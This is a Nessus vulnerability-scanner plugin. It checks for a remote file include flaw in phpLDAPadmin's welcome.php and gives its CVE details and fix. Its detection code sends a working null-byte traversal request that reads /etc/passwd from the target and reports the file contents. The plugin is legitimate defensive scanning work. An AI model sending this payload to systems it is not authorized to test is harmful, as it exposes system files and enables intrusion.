#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19547);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2017/04/25 14:31:38 $");

  script_cve_id("CVE-2005-2792", "CVE-2005-2793");
  script_bugtraq_id(14695);
  script_osvdb_id(19068);

  script_name(english:"phpLDAPadmin custom_welcome_page Parameter File Include Vulnerability");
  script_summary(english:"Checks for custom_welcome_page parameter file include vulnerability in phpLDAPadmin");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running phpLDAPadmin, a PHP-based LDAP
browser. 

The version of phpLDAPadmin installed on the remote host fails to
properly sanitize user-supplied input to the 'custom_welcome_page'
parameter of the 'welcome.php' script before using it to include PHP
code.  By leveraging this flaw, an attacker may be able to view
arbitrary files on the remote host and execute arbitrary PHP code,
possibly taken from third-party hosts.");
  # https://web.archive.org/web/20120402164347/http://retrogod.altervista.org/phpldap.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e281f575");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Aug/414");
  script_set_attribute(attribute:"solution", value:
"Upgrade to phpLDAPadmin 0.9.7-alpha6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2005/08/31");
  script_set_attribute(attribute:"vuln_publication_date", value:"2005/08/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:deon_george:phpldapadmin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");
 
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw.
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/welcome.php?",
      "custom_welcome_page=/etc/passwd%00"
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Failed opening .*'/etc/passwd")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
